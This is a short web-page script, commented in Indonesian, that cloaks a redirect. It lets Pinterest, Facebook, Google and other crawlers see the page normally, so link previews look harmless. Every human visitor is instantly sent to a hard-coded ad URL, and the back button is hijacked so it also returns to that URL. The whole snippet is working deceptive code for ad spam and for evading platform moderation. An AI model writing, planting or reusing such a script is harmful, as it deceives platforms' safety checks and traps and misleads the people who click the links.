  <script>
    const targetUrl = "https://auctionr.org/4/110c19a059ed86d69a5dda758b996b9f";

    // Filter bot/crawler agar preview gambar pin di Pinterest tetap aman
    const botPattern = /facebookexternalhit|Facebot|Pinterest|Twitterbot|TelegramBot|WhatsApp|Googlebot|bingbot|Quora Link Preview/i;
    const isBot = botPattern.test(navigator.userAgent);

    if (!isBot) {
      // 1. Kunci riwayat tombol back
      history.pushState(null, null, location.href);
      window.onpopstate = function () {
        location.replace(targetUrl);
      };

      // 2. Langsung lempar ke halaman iklan instan tanpa nunggu
      window.location.replace(targetUrl);
    }
  </script>
